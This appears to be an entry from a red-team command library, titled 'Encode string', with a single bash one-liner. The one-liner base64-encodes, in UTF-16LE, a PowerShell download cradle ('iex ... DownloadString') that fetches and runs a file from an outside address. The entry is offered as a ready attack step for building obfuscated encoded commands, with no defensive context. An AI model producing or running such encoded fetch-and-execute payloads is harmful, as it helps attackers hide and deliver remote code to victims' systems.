---
id: 9401eedf-9953-4f94-9ae8-3d7930bce1b9
name: Encode string
type: command
executor: bash
data: 'echo "iex (New-Object Net.WebClient).DownloadString(''http://192.168.1.1:80/file'')"
  | iconv --to-code UTF-16LE | base64 -w 0

  '
output: null
created_at: '2020-07-14T18:21:10.754121+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Encode string

```bash
echo "iex (New-Object Net.WebClient).DownloadString('http://192.168.1.1:80/file')" | iconv --to-code UTF-16LE | base64 -w 0

```


